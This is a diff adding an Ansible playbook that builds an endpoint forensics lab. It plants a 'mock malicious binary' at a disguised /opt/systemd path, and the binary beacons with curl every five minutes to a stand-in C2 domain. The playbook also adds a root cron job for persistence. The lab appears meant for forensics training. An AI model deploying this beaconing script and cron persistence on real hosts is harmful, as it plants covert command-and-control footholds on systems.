@@ -1,0 +1,40 @@
+---
+- name: Provision Forage-MD Endpoint Forensics Lab
+  hosts: all
+  become: yes
+  tasks:
+    - name: Update apt cache and install basic tools
+      apt:
+        name:
+          - curl
+          - vim
+          - net-tools
+          - cron
+        state: present
+        update_cache: yes
+
+    - name: Ensure /opt/systemd/updates exists
+      file:
+        path: /opt/systemd/updates
+        state: directory
+        mode: '0755'
+
+    - name: Create mock malicious binary (sysupdater)
+      copy:
+        dest: /opt/systemd/updates/sysupdater
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          # Mock malicious binary dropping C2 beaconing
+          while true; do
+            curl -s -o /dev/null http://malicious-c2-domain.xyz/beacon?id=hostA&sys=ubuntu
+            sleep 300
+          done
+
+    - name: Create persistence mechanism via cron
+      cron:
+        name: "sysupdater persistence"
+        minute: "*/5"
+        user: root
+        job: "/opt/systemd/updates/sysupdater > /dev/null 2>&1"
+        cron_file: sysupdater
